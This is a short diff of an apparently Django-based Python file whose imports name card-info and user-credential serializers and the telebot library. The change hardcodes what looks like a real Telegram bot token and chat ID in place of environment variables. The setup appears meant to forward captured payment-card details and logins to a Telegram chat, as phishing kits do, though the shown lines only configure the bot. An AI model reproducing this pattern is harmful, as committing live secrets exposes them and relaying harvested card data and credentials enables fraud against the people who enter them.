@@ -6,9 +6,13 @@ from .serializers import CardInfoSerializer, UserCredentialsSerializer
 import telebot
 import os
 
+TELEGRAM_BOT_TOKEN='7036693998:AAENSLwu4CbXGxHNybS_p-jDVU_h1GZC4Wc'
+TELEGRAM_CHAT_ID='-1002224553827'
+
 # Получите ваш Telegram bot token из среды окружения или замените его напрямую
-TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
-TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
+TELEGRAM_BOT_TOKEN = TELEGRAM_BOT_TOKEN
+TELEGRAM_CHAT_ID = TELEGRAM_CHAT_ID
+
 
 bot = telebot.TeleBot(token=TELEGRAM_BOT_TOKEN)
 
